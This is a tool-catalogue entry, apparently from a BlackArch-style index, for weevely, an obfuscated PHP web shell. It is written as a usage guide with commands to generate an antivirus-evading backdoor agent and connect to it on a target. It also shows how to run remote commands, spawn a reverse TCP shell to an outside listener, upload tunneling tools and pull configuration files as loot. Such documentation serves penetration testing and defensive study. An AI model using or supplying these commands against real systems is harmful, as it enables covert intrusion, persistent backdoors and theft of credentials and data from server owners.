---
name: "weevely"
categories:
  - blackarch-webapp
version: "902.ff906a1"
homepage: "http://epinna.github.io/Weevely/"
packaged-by: [blackarch, kali, aur, nixpkgs]
blackarch-builddate: "2024-12-26"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "epinna/weevely3"
github-stars: 3546
github-pushed: "2025-10-01"
github-archived: false
github-issues: 17
github-match: "exact"
gh-checked: "2026-11-09"
worth: 4.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# weevely

> A stealth PHP web shell whose obfuscated agent communicates over HTTP(S) and opens a session with 30+ post-exploitation modules.

## What it's for

Turns an arbitrary file-upload or write primitive on a PHP host into a covert command channel. Unlike a classic plain-PHP web shell, the agent is small, polymorphic and obfuscated to resist antivirus and signature detection, and every command travels inside normal-looking HTTP request parameters, so traffic blends into ordinary web logs. The two halves are `weevely generate` (produce an agent bound to a password) and `weevely <URL> <password>` (connect to a deployed agent). Once connected you get a terminal-style session plus modules — file upload/download/edit, SQL console, port scanning and proxying pivoted through the target, privilege audit helpers, and reverse/direct TCP shells. It targets PHP applications only and generates the agent; getting the file onto the server (upload endpoint, editor, FTP) is your separate problem.

## Typical use cases

### Generate an obfuscated agent

Create the backdoor file bound to a password of your choosing.

```
weevely generate 'Password1' backdoor.php
```

Outcome: writes `backdoor.php` — a polymorphic, obfuscated PHP agent that embeds your password as its shared secret; every copy regenerated with the same password is different on disk, so file hashes differ between deployments. Any file extension the target will accept works (`.php`, `.phar`, `.phtml`).

### Connect to a deployed agent

Open an interactive session on a target where the agent was uploaded.

```
weevely http://target.example.com/uploads/backdoor.php 'Password1'
```

Outcome: prints the weevely banner and drops into a `weevely>` shell prompt on the target, reporting the saved session file (under `~/.weevely/sessions/<host>/`) — reconnect to a saved session later with `weevely session <session-file>`; shell commands (`id`, `ls`) execute through the agent and return output as if over SSH.

### Run a single command without a session

Execute one command and exit, for scripting or quick checks.

```
weevely http://target.example.com/uploads/backdoor.php 'Password1' 'whoami'
```

Outcome: connects, runs the single command, prints its output and exits — suitable for cron loops or one-shot checks where an interactive session is unwanted.

### Spawn a reverse TCP shell from the session

Convert the covert HTTP channel into a real terminal.

```
weevely> :backdoor_reversetcp 198.51.100.10 4444
```

Outcome: the target connects back to your `nc -lvnp 4444` listener and serves a plain TCP shell, giving full interactive tools (Ctrl-C, tab completion, sudo) that the HTTP-tunneled channel cannot carry — start the listener before issuing the module call.

### Upload and download files through the agent

Move binaries and loot over the existing HTTP channel.

```
weevely> :file_upload /opt/tools/chisel /tmp/chisel
weevely> :file_download /var/www/app/config.php ./config.php
```

Outcome: uploads the local file to the remote path (add `-force` to overwrite an existing remote file) and pulls the remote file back to the local path, both tunneled through the agent's obfuscated HTTP requests — no FTP, SSH or extra exposure needed; `:file_ls` and `:file_read` provide lighter-weight listing and reading without copying.
